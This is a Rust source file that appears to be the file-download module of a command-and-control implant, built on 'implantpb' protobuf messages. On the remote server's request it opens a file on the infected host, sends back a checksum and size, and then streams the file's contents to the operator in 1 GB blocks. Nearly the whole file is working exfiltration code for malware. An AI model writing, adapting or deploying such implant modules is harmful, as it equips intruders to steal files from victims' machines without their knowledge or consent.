use crate::{Module, TaskResult, check_field, check_request, Result, TaskError};
use malefic_helper::protobuf::implantpb::{spite::Body, Block};
use malefic_helper::protobuf::implantpb::DownloadResponse;
use std::fs::{OpenOptions, metadata};
use malefic_helper::common::filesys::check_sum;
use async_trait::async_trait;
use std::io::Read;
use malefic_trait::module_impl;
use malefic_helper::debug;

pub struct Download {}

#[async_trait]
#[module_impl("download")]
impl Module for Download {
    async fn run(&mut self, id: u32, receiver: &mut crate::Input, sender: &mut crate::Output) -> Result {
        let request = check_request!(receiver, Body::DownloadRequest)?;

        let path: String = check_field!(request.path)?;
        let path_clone = path.clone();
        let mut file = OpenOptions::new()
            .read(true)
            .open(path_clone)?;
        let buffer_size = 1024*1024*1024;
        let mut buffer = vec![0; 1024*1024*1024];
        let mut seq = 0;

        let sum = check_sum(&path)?;
        let metadata = metadata(&path)?;
        let size = metadata.len();
        debug!("checksum: {}, size: {}", sum, size);
        let _ = sender.send(TaskResult::new_with_download_response(id,Body::DownloadResponse(DownloadResponse{checksum: (sum), size: (size)})));
        let ack = check_request!(receiver, Body::AsyncAck)?;
        if !ack.success {
            return Err((TaskError::FieldInvalid { msg: "download server ack failed".to_string()}).into());
        }
        loop {
            let n = file.read(&mut buffer)?;
            let mut block = Block {
                block_id: seq,
                content: buffer[..n].to_vec(),
                end: n < buffer_size, // 如果读取的字节少于缓冲区大小，则这是最后一个块
            };
            if n < buffer_size{
                block.end = true;
                return Ok(TaskResult::new_with_body(id, Body::Block(block)));
            }
            if block.end {
                return Ok(TaskResult::new_with_body(id, Body::Block(block)));
            } else {
                let _ = sender.send(TaskResult::new_with_body(id, Body::Block(block)));
                seq += 1; // 准备下一个序列号
            }
        }
    }
}